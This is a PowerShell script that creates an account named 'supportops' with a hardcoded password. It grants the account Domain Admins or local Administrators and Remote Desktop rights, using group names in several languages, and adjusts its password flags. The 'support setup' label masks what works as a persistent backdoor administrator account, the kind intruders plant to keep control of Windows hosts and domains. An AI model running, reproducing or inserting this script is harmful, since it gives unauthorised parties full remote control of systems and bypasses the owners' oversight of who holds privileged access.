$ErrorActionPreference = "Continue"
$password = "Qz7!Mtn5#R2p"
$computer = Get-CimInstance Win32_ComputerSystem
$isDc = $computer.DomainRole -in 4, 5
$net = Join-Path $env:SystemRoot "System32\net.exe"

$existing = & $net user supportops 2>$null
if ($LASTEXITCODE -ne 0) {
    & $net user supportops $password /add 2>&1 |
        Out-String |
        Write-Output
} else {
    & $net user supportops $password 2>&1 |
        Out-String |
        Write-Output
}

if ($isDc) {
    & $net user supportops $password /domain 2>&1 |
        Out-String |
        Write-Output
    foreach ($group in @(
        "Domain Admins",
        "Admins. del dominio",
        "Admins du domaine",
        "Domänen-Admins"
    )) {
        & $net group $group supportops /domain /add 2>&1 |
            Out-String |
            Write-Output
    }
    & $net group "Account Operators" supportops /domain /add 2>&1 |
        Out-String |
        Write-Output
} else {
    foreach ($group in @(
        "Administrators",
        "Administradores",
        "Administrateurs",
        "Administratoren"
    )) {
        & $net localgroup $group supportops /add 2>&1 |
            Out-String |
            Write-Output
    }
    foreach ($group in @(
        "Remote Desktop Users",
        "Usuarios de escritorio remoto",
        "Utilisateurs du Bureau à distance",
        "Remotedesktopbenutzer"
    )) {
        & $net localgroup $group supportops /add 2>&1 |
            Out-String |
            Write-Output
    }
}

try {
    $account = [ADSI]"WinNT://$env:COMPUTERNAME/supportops,user"
    $flags = [int]$account.UserFlags.Value
    $account.Put("UserFlags", ($flags -band (-bnot 0x40)))
    $account.Put("PasswordExpired", 0)
    $account.SetInfo()
} catch {
    Write-Output "SUPPORTOPS_FLAGS_ERROR=$($_.Exception.Message)"
}

& $net user supportops 2>&1 | Out-String | Write-Output
Write-Output "SUPPORT_SETUP_DONE"
